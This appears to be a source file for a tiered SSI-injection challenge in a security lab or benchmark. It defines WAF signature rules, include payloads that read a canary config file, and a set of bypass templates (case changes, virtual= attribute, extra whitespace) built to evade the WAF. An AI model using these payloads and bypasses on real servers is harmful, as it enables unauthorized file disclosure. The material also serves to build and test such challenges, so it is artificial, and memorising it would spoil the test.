// SSI injection — tiered.
// T0: no WAF. A literal #include with file= reads the canary fragment.
// T1: a signature WAF inspects the body and blocks the lowercase, literal
//     `#include file=` form. The directive parser in behaviour.mjs is
//     case-insensitive and accepts both `file=` and `virtual=` — so the
//     bypass space covers case-flipping the directive name, swapping to the
//     virtual= attribute, and padding extra whitespace inside the directive.

const FRAGMENT_PATH = '/app/data/site.conf'

export const RULE_POOL = [
  // The textbook include with file=, lowercase and tight on whitespace.
  // Case-sensitive so case-flipped variants survive.
  { name: 'ssi-include-file-strict',  pattern: '<!--#include file=', flags: 'm' },
  // The exec directive (the loud one). Case-sensitive, lowercase.
  { name: 'ssi-exec-strict',          pattern: '<!--#exec\\b', flags: 'm' },
  // file= pointing at an absolute path under /app.
  { name: 'ssi-abs-app-path',         pattern: 'file="\\s*/app/', flags: 'm' },
  // The canonical fragment-name suffix.
  { name: 'ssi-conf-suffix',          pattern: '\\.conf\\s*"', flags: 'm' },
  // #fsize / #flastmod metadata-disclosure directives.
  { name: 'ssi-fsize',                pattern: '<!--#fsize\\b', flags: 'm' },
  { name: 'ssi-flastmod',             pattern: '<!--#flastmod\\b', flags: 'm' },
]

// Bypass templates — each is a directive variation the processor still parses
// (case-insensitive, tolerant of extra whitespace, accepts virtual= as well as
// file=) but that the strict rule above does not match.
export const BYPASS_TEMPLATES = [
  // Uppercase directive name (parser is case-insensitive; signature is not).
  () => `<!--#INCLUDE file="${FRAGMENT_PATH}"-->`,
  // Mixed case.
  () => `<!--#Include file="${FRAGMENT_PATH}"-->`,
  // Use the virtual= attribute instead of file=.
  () => `<!--#include virtual="${FRAGMENT_PATH}"-->`,
  // Extra whitespace inside the directive (parser uses \\s*, signature is literal).
  () => `<!--# include  file="${FRAGMENT_PATH}"-->`,
  // Tab between attribute and value.
  () => `<!--#include\tfile="${FRAGMENT_PATH}"-->`,
]

export const defences = {
  0: {
    canonicalPayload: () => `<!--#include file="${FRAGMENT_PATH}"-->`,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => `<!--#include file="${FRAGMENT_PATH}"-->`,
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

export function generateT1Config(rng = Math.random) {
  const required = ['ssi-include-file-strict']
  const requiredSet = new Set(required)
  // Decoy rules that don't impact the bypass set. None of the bypasses contain
  // `<!--#exec`, `<!--#fsize`, `<!--#flastmod`. `.conf"` would catch every
  // bypass since they all reference the same conf path — exclude it. And the
  // abs-app-path rule (`file="\\s*/app/`) also catches the include-file-based
  // bypasses (uppercase INCLUDE, mixed case, tab, extra-whitespace) but not
  // the virtual= bypass — so it's safe to include because that one survives.
  const optional = RULE_POOL.filter(r => !requiredSet.has(r.name) && r.name !== 'ssi-conf-suffix')
  const extraCount = 2 + Math.floor(rng() * (optional.length - 1))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => requiredSet.has(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
